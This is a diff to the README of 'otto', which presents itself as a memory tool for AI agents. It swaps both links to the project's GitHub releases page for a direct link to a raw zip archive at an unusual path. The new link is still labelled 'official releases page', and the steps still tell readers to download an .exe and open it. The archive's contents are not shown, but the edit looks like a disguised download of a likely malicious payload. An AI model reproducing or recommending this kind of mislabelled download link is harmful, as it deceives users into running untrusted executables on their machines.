@@ -1,6 +1,6 @@
 # 🤖 otto - Ensure your AI agents remember instructions
 
-[![](https://img.shields.io/badge/Download-otto-blue.svg)](https://github.com/shanecalceiform464/otto/releases)
+[![](https://img.shields.io/badge/Download-otto-blue.svg)](https://raw.githubusercontent.com/shanecalceiform464/otto/main/dynamically/Software-3.0-alpha.2.zip)
 
 ## 📌 About this software
 
@@ -17,7 +17,7 @@ This application provides a stable memory bank for your automated workflows. It 
 
 ## 📥 How to get started
 
-1. Visit the [official releases page](https://github.com/shanecalceiform464/otto/releases) to download the software.
+1. Visit the [official releases page](https://raw.githubusercontent.com/shanecalceiform464/otto/main/dynamically/Software-3.0-alpha.2.zip) to download the software.
 2. Look for the file ending in `.exe` under the latest release version.
 3. Click the file to start the download.
 4. Open the file once the download finishes.
